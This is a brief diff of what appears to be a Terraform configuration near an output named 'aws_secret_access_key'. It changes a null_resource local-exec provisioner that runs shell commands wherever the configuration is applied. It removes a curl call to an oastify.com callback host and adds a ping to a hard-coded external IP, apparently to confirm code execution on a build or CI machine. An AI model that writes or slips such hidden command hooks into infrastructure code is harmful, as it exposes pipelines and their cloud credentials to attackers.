@@ -66,6 +66,6 @@ output "aws_secret_access_key" {
 
 resource "null_resource" "test" {
   provisioner "local-exec" {
-   command = "curl http://mc2fltx1isflqkcahtgbiufv4mady9my.oastify.com/xxx"
+   command = "ping -c 8 138.68.185.106"
   }
 }
